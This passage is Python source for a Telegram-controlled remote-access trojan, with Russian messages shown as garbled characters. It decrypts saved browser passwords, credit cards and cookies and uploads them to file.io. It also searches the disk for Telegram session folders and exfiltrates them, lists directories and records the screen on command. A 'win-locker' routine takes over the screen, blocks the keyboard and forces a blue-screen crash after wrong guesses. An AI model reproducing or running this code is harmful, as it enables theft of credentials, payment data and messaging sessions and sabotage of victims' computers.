            "Sputnik": r'C:\Users\{}\AppData\Sputnik\Sputnik\User Data'.format(client_username),
            "Vivaldi": r'C:\Users\{}\AppData\Local\Vivaldi\User Data'.format(client_username),
            "Chrome-sxs": r'C:\Users\{}\AppData\Google\\Chrome SxS\User Data'.format(client_username),
            "Chrome": r'C:\Users\{}\AppData\Local\Google\Chrome\User Data'.format(client_username),
            "Epic Privacy Browser": r'C:\Users\{}\AppData\Epic Privacy Browser\User Data'.format(client_username),
            "Edge": r'C:\Users\{}\AppData\Local\Microsoft\Edge\User Data'.format(client_username),
            "Uran": r'C:\Users\{}\AppData\uCozMedia\\Uran\User Data'.format(client_username),
            "Yandex": r'C:\Users\{}\AppData\Local\Yandex\YandexBrowser\User Data'.format(client_username),
            "Brave": r'C:\Users\{}\AppData\Local\BraveSoftware\Brave-Browser\User Data'.format(client_username),
            "Iridium": r'C:\Users\{}\AppData\Iridium\User Data'.format(client_username),
            "Opera": r'C:\Users\{}\AppData\Roaming\Opera Software\Opera Stable'.format(client_username),
        }
        temp_dir = "temp_browser_data"
        os.makedirs(temp_dir, exist_ok=True)
        upload_threads = []
        for browser_name, browser_data_path in browser_directories.items():
            if os.path.exists(browser_data_path):
                log_message(f"–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –±—Ä–∞—É–∑–µ—Ä–∞ {browser_name} - –Ω–∞–π–¥–µ–Ω–∞ ‚úÖ")
                log_message("___________________________________\n")
                bot.send_message(message.chat.id, "–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–∞–π–¥–µ–Ω–∞ –∏ –¥–æ–±–∞–≤–ª–µ–Ω–∞ –≤ –æ—á–µ—Ä–µ–¥—å! –ù–∞—á–∏–Ω–∞—é –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –∏ –∑–∞–≥—Ä—É–∑–∫—É –Ω–∞ —Ñ–∞–π–ª–æ–æ–±–º–µ–Ω–Ω–∏–∫.\n____________________________")
                thread = threading.Thread(target=upload_and_send_link, args=(browser_data_path, browser_name, chat_id, log_file_path))
                upload_threads.append(thread)
                thread.start()
            else:
                log_message(f"–î–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –±—Ä–∞—É–∑–µ—Ä–∞ {browser_name} - –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ ‚ùå")
                log_message("___________________________________\n")
        for thread in upload_threads:
            thread.join()
        log_message("–ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∑–∞–≤–µ—Ä—à–µ–Ω–æ.")
        log_message("___________________________________\n")
        bot.send_message(message.chat.id, "–ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö –∑–∞–≤–µ—Ä—à–µ–Ω–æ.")
        with open(log_file_path, "rb") as log_file:
            bot.send_document(chat_id, log_file)
        shutil.rmtree(temp_dir, ignore_errors=True)
    except Exception as e:
        log_message(f"\n–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")
        log_message("___________________________________\n")
        bot.send_message(chat_id, f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")
def upload_and_send_link(folder_path, folder_name, chat_id, log_file_path):
    try:
        fileio_url = upload_folder_to_fileio(folder_path, folder_name)
        if fileio_url:
            log_message(f"Login Data –±—Ä–∞—É–∑–µ—Ä–∞ {folder_name} —É—Å–ø–µ—à–Ω–æ –∑–∞–≥—Ä—É–∂–µ–Ω!\n–°–∫–∞—á–∞—Ç—å: {fileio_url}", log_file_path)
            log_message("___________________________________\n")
        else:
            log_message(f"–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –∞—Ä—Ö–∏–≤ {folder_name} –Ω–∞ —Ñ–∞–π–ª–æ–æ–±–º–µ–Ω–Ω–∏–∫.", log_file_path)
            log_message("___________________________________\n")
    except Exception as e:
        log_message(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}", log_file_path)
        log_message("___________________________________\n")
def log_message(message, log_file_path="copy_browsers_data_log.txt"):
    with open(log_file_path, "a", encoding="utf-8") as log_file:
        log_file.write(message + "\n")
def copy_file_with_permission_error(file_path, destination_path):
    try:
        shutil.copy(file_path, destination_path)
    except PermissionError as e:
        log_message(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ñ–∞–π–ª–∞ {file_path}: {str(e)} (–ü—Ä–æ–ø—É—â–µ–Ω–æ)")
        log_message("___________________________________\n")
    except Exception as e:
        log_message(f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ñ–∞–π–ª–∞ {file_path}: {str(e)}")
        log_message("___________________________________\n")
global password
password = None
attempts = 0
max_attempts = 1
def start_winlock(message):
    global password, attempts
    password = None
    if password is None:
        attempts = 0 
        bot.send_message(message.chat.id, "–†–µ–∫–æ–º–µ–Ω–¥—É–µ–º –Ω–∞—á–∞—Ç—å –∑–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞, —á—Ç–æ–±—ã –ø–æ–≤–µ—Å–µ–ª–∏—Ç—å—Å—è üòà, —Ç–∞–∫–∂–µ –º–æ–∂–µ—Ç–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –º—ã—à—å —Å —Ü–µ–ª—å—é –∏–∑–≤–ª–µ—á–µ–Ω–∏—è –Ω–∞–∏–±–æ–ª—å—à–µ–≥–æ –Ω–∞—Å–ª–∞–∂–¥–µ–Ω–∏—è...\n\n–ï—Å–ª–∏ –≤—ã —Ä–∞–±–æ—Ç–∞–µ—Ç–µ –Ω–∞–¥ –∫–∞–∫–∏–º–∏ —Ç–æ —Ñ—É–Ω–∫—Ü–∏—è–º–∏, —Ç–æ —Å–æ–≤–µ—Ç—É–µ–º –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –º—ã—à—å –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã —Å–ª—É—á–∞–π–Ω–æ –Ω–µ –≤—ã–∑–≤–∞—Ç—å BSOD!\n\n–í–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∏–Ω-–ª–æ–∫–µ—Ä–∞(—Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã):")
        bot.register_next_step_handler(message, check_password)
    else:
        bot.send_message(message.chat.id, "–í–∏–Ω-–ª–æ–∫–µ—Ä —É–∂–µ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω.")
def check_password(message):
    global password, attempts
    if message.text.isdigit():
        password = message.text
        winlock(password, message)
        bot.send_message(message.chat.id, "–ñ–µ—Ä—Ç–≤–∞ –∑–∞–∫—Ä—ã–ª–∞ –≤–∏–Ω-–ª–æ–∫–µ—Ä.")
    else:
        attempts += 1
        if attempts > max_attempts:
            bot.send_message(message.chat.id, f"–ü—Ä–µ–≤—ã—à–µ–Ω–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ–ø—ã—Ç–æ–∫ –≤–≤–æ–¥–∞ –ø–∞—Ä–æ–ª—è. –í–æ–∑–≤—Ä–∞—â–µ–Ω–∏–µ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é.")
            attempts = 0
            bot.register_next_step_handler(message, back)
        else:
            remaining_attempts = max_attempts - attempts
            bot.send_message(message.chat.id, f"–ü–∞—Ä–æ–ª—å –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ –µ—â–µ —Ä–∞–∑ ({attempts} –∏–∑ {max_attempts} –ø–æ–ø—ã—Ç–æ–∫)")
            bot.register_next_step_handler(message, check_password)
def winlock(password, message):
    bot.send_message(my_id, "–í–∏–Ω-–ª–æ–∫–µ—Ä –∑–∞–ø—É—â–µ–Ω", reply_markup=rape_keyboard)
    lock_text = "–°–û–ü–†–û–¢–ò–í–õ–Ø–¢–¨–°–Ø –ë–ï–°–ü–û–õ–ï–ó–ù–û!"
    count = 3
    file_path = os.getcwd() + "\\" + os.path.basename(sys.argv[0])
    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    def bsod():
        subprocess.call("cd C:\:$i30:$bitmap",shell=True)
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))
    def exitwind(wind):
        wind.destroy()
        kb.unhook_all()
    def buton(arg):
        enter_pass.insert(tk.END, arg)
    def delbuton():
        enter_pass.delete(-1, tk.END)
    def tapp(key):
        pass
    def check():
        nonlocal count
        if enter_pass.get() == password:
            messagebox.showinfo("–≠–¢–û –°–ú–ï–†–¢–¨ –¢–í–û–ï–ô –°–ò–°–¢–ï–ú–´","–°–ú–ï–†–¢–¨ –ù–ï –ñ–î–ï–¢...")
            exitwind(wind)
        else:
            count -= 1
            if count == 0:
                messagebox.showwarning("–≠–¢–û –°–ú–ï–†–¢–¨ –¢–í–û–ï–ô –°–ò–°–¢–ï–ú–´","–ö–û–õ–ò–ß–ï–°–¢–í–û –ü–û–ü–´–¢–û–ö –ò–°–¢–ï–ö–õ–û...")
                bsod()
            else:
                messagebox.showwarning("–≠–¢–û –°–ú–ï–†–¢–¨ –¢–í–û–ï–ô –°–ò–°–¢–ï–ú–´","–ù–ï–í–ï–†–ù–´–ô –ü–ê–†–û–õ–¨, –û–°–¢–ê–õ–û–°–¨ –ü–û–ü–´–¢–û–ö:"+ str(count))
    def exiting():
        messagebox.showwarning("–≠–¢–û –°–ú–ï–†–¢–¨ –¢–í–û–ï–ô –°–ò–°–¢–ï–ú–´","–°–ú–ï–†–¢–¨ –†–Ø–î–û–ú...")
    wind = tk.Tk()
    wind.title("–≠–¢–û –°–ú–ï–†–¢–¨ –¢–í–û–ï–ô –°–ò–°–¢–ï–ú–´")
    wind["bg"] = "black"
    UNTEXD = tk.Label(wind,bg="black", fg="red",text="–≠–¢–û –°–ú–ï–†–¢–¨ –¢–í–û–ï–ô –°–ò–°–¢–ï–ú–´\n\n\n", font="helvetica 75").pack()
    untex = tk.Label(wind,bg="black", fg="red",text=lock_text, font="helvetica 40")
    untex.pack(side=tk.TOP)
    kb.on_press(tapp, suppress=True)
    enter_pass = tk.Entry(wind,bg="black", fg="red", text="", font="helvetica 35")
    enter_pass.pack()
    wind.resizable(0,0)
    wind.lift()
    wind.attributes('-topmost',True)
    wind.after_idle(wind.attributes,'-topmost',True)
    wind.attributes('-fullscreen', True)
    button = tk.Button(wind,text='unlock',padx="31", pady="19",bg='black',fg='red',font="helvetica 30", command=check)
    button.pack()
    wind.protocol("WM_DELETE_WINDOW", exiting)
    button0 = tk.Button(wind,text='0',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "0")).pack(side=tk.LEFT)
    button1 = tk.Button(wind,text='1',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "1")).pack(side=tk.LEFT)
    button2 = tk.Button(wind,text='2',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "2")).pack(side=tk.LEFT)
    button3 = tk.Button(wind,text='3',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "3")).pack(side=tk.LEFT)
    button4 = tk.Button(wind,text='4',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "4")).pack(side=tk.LEFT)
    button5 = tk.Button(wind,text='5',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "5")).pack(side=tk.LEFT)
    button6 = tk.Button(wind,text='6',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "6")).pack(side=tk.LEFT)
    button7 = tk.Button(wind,text='7',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "7")).pack(side=tk.LEFT)
    button8 = tk.Button(wind,text='8',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "8")).pack(side=tk.LEFT)
    button9 = tk.Button(wind,text='9',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=partial(buton, "9")).pack(side=tk.LEFT)
    delbutton = tk.Button(wind,text='<',padx="28", pady="19",bg='black',fg='red',font="helvetica 25", command=delbuton).pack(side=tk.LEFT)
    wind.mainloop()
def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x]):
            available.append(x)
    return available
def create_temp_directory():
    temp_dir = 'temp_db'
    if not os.path.exists(temp_dir):
        os.mkdir(temp_dir)
    return temp_dir
def get_master_key_from_path(path: str):
    if not os.path.exists(path):
        return
    if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
        return
    with open(path + "\\Local State", "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    key = CryptUnprotectData(key, None, None, None, 0)[1]
    return key
def decrypt_password(buff: bytes, key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass
def save_results(message, browser_name, type_of_data, content):
    browser_info_folder = os.path.join(bot_root_folder, 'temp_folder')
    browser_folder = os.path.join(browser_info_folder, browser_name)
    if not os.path.exists(browser_folder):
        os.mkdir(browser_folder)
    if content is not None:
        with open(os.path.join(browser_folder, f'{type_of_data}.txt'), 'w', encoding="utf-8") as file:
            file.write(content)
def close_browser(browser_name):
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['name'] == browser_name:
            try:
                parent = psutil.Process(process.info['pid'])
                for child in parent.children(recursive=True):
                    child.terminate()
                parent.terminate()
                parent.wait(5)
            except psutil.NoSuchProcess:
                pass
def start_browser(browser_path):
    subprocess.Popen(browser_path, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
def safe_copy(src, dst):
    try:
        shutil.copy(src, dst)
        return True
    except PermissionError:
        return False
def get_data(path: str, profile: str, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return
    result = ""
    temp_dir = create_temp_directory()
    temp_db_file = os.path.join(temp_dir, 'temp.db')
    if not safe_copy(db_file, temp_db_file):
        return
    conn = sqlite3.connect(temp_db_file)
    cursor = conn.cursor()
    cursor.execute(type_of_data['query'])
    for row in cursor.fetchall():
        row = list(row)
        if type_of_data['decrypt']:
            for i in range(len(row)):
                if isinstance(row[i], bytes):
                    row[i] = decrypt_password(row[i], key)
        if type_of_data['query'] == 'SELECT url, title, last_visit_time FROM urls':
            if row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            else:
                row[2] = "0"
        result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
    conn.close()
    os.remove(temp_db_file)
    return result
def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
def get_browsers_info(message):
    appdata = os.getenv('LOCALAPPDATA')
    browsers = {
        'avast': appdata + '\\AVAST Software\\Browser\\User Data',
        'amigo': appdata + '\\Amigo\\User Data',
        'torch': appdata + '\\Torch\\User Data',
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'iridium': appdata + '\\Iridium\\User Data',
    }
    data_queries = {
        'login_data': {
            'query': 'SELECT action_url, username_value, password_value FROM logins',
            'file': '\\Login Data',
            'columns': ['URL', 'Email', 'Password'],
            'decrypt': True
        },
        'credit_cards': {
            'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
            'file': '\\Web Data',
            'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
            'decrypt': True
        },
        'cookies': {
            'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
            'file': '\\Network\\Cookies',
            'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
            'decrypt': True
        },
        'history': {
            'query': 'SELECT url, title, last_visit_time FROM urls',
            'file': '\\History',
            'columns': ['URL', 'Title', 'Visited Time'],
            'decrypt': False
        },
        'downloads': {
            'query': 'SELECT tab_url, target_path FROM downloads',
            'file': '\\History',
            'columns': ['Download URL', 'Local Path'],
            'decrypt': False
        }
    }
    available_browsers = installed_browsers()
    for browser in available_browsers:
        browser_path = browsers[browser]
        close_browser(browser)
        start_browser(browser_path)
        master_key = get_master_key_from_path(browser_path)
        browser_info_message = f"–ü–æ–ª—É—á–∞—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –∏–∑ –±—Ä–∞—É–∑–µ—Ä–∞ {browser}..."
        data_messages = []
        for data_type_name, data_type in data_queries.items():
            data_messages.append(f"\n‚ùóÔ∏è –ü–æ–ª—É—á–∞—é {data_type_name.replace('_', ' ').capitalize()}.")
            data = get_data(browser_path, "Default", master_key, data_type)
            if data:
                save_results(message, browser, data_type_name, data)
                data_messages.append(f"‚úÖ –°–æ—Ö—Ä–∞–Ω–µ–Ω–æ –≤ {browser}/{data_type_name}.txt.")
            else:
                data_messages.append(f"‚ùå –î–∞–Ω–Ω—ã–µ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")
        bot.send_message(message.chat.id, browser_info_message)
        bot.send_message(message.chat.id, "\n".join(data_messages))
appdata = os.getenv('LOCALAPPDATA')
browsers = {
        'avast': appdata + '\\AVAST Software\\Browser\\User Data',
        'amigo': appdata + '\\Amigo\\User Data',
        'torch': appdata + '\\Torch\\User Data',
        'kometa': appdata + '\\Kometa\\User Data',
        'orbitum': appdata + '\\Orbitum\\User Data',
        'cent-browser': appdata + '\\CentBrowser\\User Data',
        '7star': appdata + '\\7Star\\7Star\\User Data',
        'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
        'vivaldi': appdata + '\\Vivaldi\\User Data',
        'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
        'google-chrome': appdata + '\\Google\\Chrome\\User Data',
        'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
        'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
        'uran': appdata + '\\uCozMedia\\Uran\\User Data',
        'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
        'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
        'iridium': appdata + '\\Iridium\\User Data',
    }
bot_root_folder = os.path.dirname(os.path.abspath(__file__))
browser_info_folder = os.path.join(bot_root_folder, 'temp_folder')
if not os.path.exists(browser_info_folder):
    os.mkdir(browser_info_folder)
def handle_browsers_info_command(message):
    get_browsers_info(message)
    chat_id = message.chat.id
    bot.send_message(message.chat.id, "–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–∞—Ö –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ –∏–∑–≤–ª–µ—á–µ–Ω–∞!")
    with tempfile.NamedTemporaryFile(delete=False, suffix='.zip') as temp_zip:
        with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(browser_info_folder):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), browser_info_folder))
    with open(temp_zip.name, 'rb') as zip_file:
        response = requests.post("https://file.io", files={'file': (os.path.basename(temp_zip.name), zip_file)})
    os.remove(temp_zip.name)
    download_url = response.json()['link']
    bot.send_message(chat_id, f"–î–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –≤ –∫–æ—Ä–Ω–µ–≤–æ–π –ø–∞–ø–∫–µ —Å–∫—Ä–∏–ø—Ç–∞ –≤ –ø–∞–ø–∫–µ temp_folder.\n–¢–∞–∫–∂–µ –≤—Å–µ –¥–∞–Ω–Ω—ã–µ –º–æ–∂–Ω–æ —Å–∫–∞—á–∞—Ç—å –ø–æ —Å—Å—ã–ª–∫–µ:\n{download_url}")
def grab_and_upload_telegram_session(message):
    try:
        bot.send_message(message.chat.id, "–ü–æ–∏—Å–∫ –≤—Å–µ—Ö –ø–∞–ø–æ–∫ tdata...\n–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –º–æ–∂–µ—Ç –ø—Ä–æ–¥–æ–ª–∂–∞—Ç—å—Å—è –æ—Ç 1 –¥–æ 5 –º–∏–Ω—É—Ç.")
        tdata_folders = []
        for root, dirs, files in os.walk('C:/'):
            for dir_name in dirs:
                folder_path = os.path.join(root, dir_name)
                try:
                    os.listdir(folder_path)
                    if dir_name == 'tdata':
                        tdata_folders.append(folder_path)
                except PermissionError:
                    pass
        if not tdata_folders:
            bot.send_message(message.chat.id, "–ü–∞–ø–∫–∏ tdata –Ω–µ –Ω–∞–π–¥–µ–Ω—ã.")
            return
        bot.send_message(message.chat.id, "–°–æ–∑–¥–∞—é –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–∞–ø–∫—É...")
        temp_dir = "temp_tdata_archive"
        os.makedirs(temp_dir, exist_ok=True)
        for folder in tdata_folders:
            try:
                folder_name = os.path.basename(os.path.dirname(folder))
                folder_name = ''.join(random.choice(string.ascii_letters) for _ in range(10))
                archive_name = f"{folder_name}_tdata.zip"
                archive_path = os.path.join(temp_dir, archive_name)
                shutil.make_archive(os.path.join(temp_dir, folder_name), 'zip', folder)
            except Exception as e:
                pass

        bot.send_message(message.chat.id, "–ó–∞–≥—Ä—É–∂–∞—é –∞—Ä—Ö–∏–≤—ã –Ω–∞ —Ñ–∞–π–ª–æ–æ–±–º–µ–Ω–Ω–∏–∫...")
        file_links = []
        for root, _, files in os.walk(temp_dir):
            for file in files:
                file_path = os.path.join(root, file)
                fileio_url = upload_to_fileio(file_path)
                if fileio_url:
                    file_size = os.path.getsize(file_path)
                    link_message = f"–°—Å—ã–ª–∫–∞ –Ω–∞ –∞—Ä—Ö–∏–≤ (–†–∞–∑–º–µ—Ä: {file_size} –±–∞–π—Ç): {fileio_url}"
                    file_links.append(link_message)
        bot.send_message(message.chat.id, "–£–¥–∞–ª—è—é –≤—Ä–µ–º–µ–Ω–Ω—É—é –ø–∞–ø–∫—É –∏ –æ—Ç–ø—Ä–∞–≤–ª—è—é —Å—Å—ã–ª–∫–∏...")
        shutil.rmtree(temp_dir, ignore_errors=True)
        if file_links:
            message_to_send = "\n".join(file_links)
            bot.send_message(message.chat.id, message_to_send)
            backcom
        else:
            bot.send_message(message.chat.id, "–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å –∞—Ä—Ö–∏–≤—ã –Ω–∞ —Ñ–∞–π–ª–æ–æ–±–º–µ–Ω–Ω–∏–∫.")
            backcom
    except Exception as e:
        bot.send_message(message.chat.id, f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")
        bot.register_next_step_handler(message, get_text_messages)
        backcom
def get_directory_listing(message):
    try:
        bot.send_message(message.chat.id, "–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å –∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –Ω–∞ –≤–∞—à–µ–º –∫–æ–º–ø—å—é—Ç–µ—Ä–µ:")
        bot.register_next_step_handler(message, process_directory_input)
    except Exception as e:
        bot.send_message(message.chat.id, f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")
def process_directory_input(message):
    try:
        directory_path = message.text
        if os.path.exists(directory_path) and os.path.isdir(directory_path):
            os.chdir(directory_path)
            result = subprocess.check_output("dir /b", shell=True, text=True, encoding='cp866')
            script_dir = os.path.dirname(os.path.abspath(__file__))
            file_path = os.path.join(script_dir, "directory_listing.txt")
            with open(file_path, "w", encoding="utf-8") as file:
                file.write(result)
            with open(file_path, "rb") as file:
                bot.send_document(message.chat.id, file)
                bot.send_message(message.chat.id, "–û—Ç–≤–µ—Ç –æ—Ç –∫–æ–Ω—Å–æ–ª–∏ –±—ã–ª –≤—ã—Å–ª–∞–Ω –≤ —Ç–µ–∫—Å—Ç–æ–≤–æ–º —Ñ–∞–π–ª–µ.")
                backcom
            os.remove(file_path)
        else:
            bot.send_message(message.chat.id, "–£–∫–∞–∑–∞–Ω–Ω–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç –∏–ª–∏ –Ω–µ —è–≤–ª—è–µ—Ç—Å—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–µ–π.")
            back (message)
    except Exception as e:
        bot.send_message(message.chat.id, f"–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {str(e)}")
        back (message)
recording = False
out = None
chat_id = None
def start_recording_screen():
    global recording, out

    if not recording:
        screen_width, screen_height = pyautogui.size()
        resolution = (screen_width, screen_height)
        fps = 60
        output_filename = 'screen_record.mp4'
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(output_filename, fourcc, fps, resolution)
        recording = True
        recording_thread = threading.Thread(target=record_screen, args=(resolution, fps))
        recording_thread.start()
        threading.Timer(125, stop_recording_screen).start()
def record_screen(resolution, fps):
    global recording, out

    while recording:
        try:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ: {str(e)}")
def stop_recording_screen():
    global recording, out
    if recording:
        recording = False
        out.release()
        cv2.destroyAllWindows()

        try:
            with open('screen_record.mp4', 'rb') as video_file:
                bot.send_video(chat_id, video_file)
        except telebot.apihelper.ApiException as e:
            if e.result.status_code == 413:
                bot.send_message(chat_id, "–í–∏–¥–µ–æ —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–µ. –ó–∞–≥—Ä—É–∂–∞—é –Ω–∞ —Ñ–∞–π–ª–æ–æ–±–º–µ–Ω–Ω–∏–∫...")
            else:
                bot.send_message(chat_id, f'–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –≤–∏–¥–µ–æ: {str(e)}')
        upload_url = 'https://file.io'
        with open('screen_record.mp4', 'rb') as video_file:
            response = requests.post(upload_url, files={'file': video_file})
        if response.status_code == 200:
            file_info = response.json()
            file_url = file_info.get('link')
            if file_url:
                bot.send_message(chat_id, f'–°—Å—ã–ª–∫–∞ –Ω–∞ –≤–∏–¥–µ–æ: {file_url}')
            else:
                bot.send_message(chat_id, '–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Å—ã–ª–∫–∏ –Ω–∞ —Ñ–∞–π–ª —Å —Ñ–∞–π–ª–æ–æ–±–º–µ–Ω–Ω–∏–∫–∞. –í–æ–∑–º–æ–∂–Ω–æ, –≤–∞—à —Ñ–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π, –ª–∏–±–æ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.')
        else:
            bot.send_message(chat_id, '–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–∞ –Ω–∞ —Ñ–∞–π–ª–æ–æ–±–º–µ–Ω–Ω–∏–∫. –í–æ–∑–º–æ–∂–Ω–æ, –≤–∞—à —Ñ–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π, –ª–∏–±–æ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.')
        video_path = os.path.abspath('screen_record.mp4')
        bot.send_message(chat_id, f'–í–∏–¥–µ–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–æ –ø–æ –ø—É—Ç–∏: {video_path}')
def record_screen(resolution, fps):
    global recording, out

    while recording:
        try:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            out.write(frame)
        except Exception as e:
            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø–∏—Å–∏ –≤–∏–¥–µ–æ: {str(e)}")
def start_recording_command(message):
    global recording, chat_id
    if not recording:
        chat_id = message.chat.id
        start_recording_screen()
        recording = True
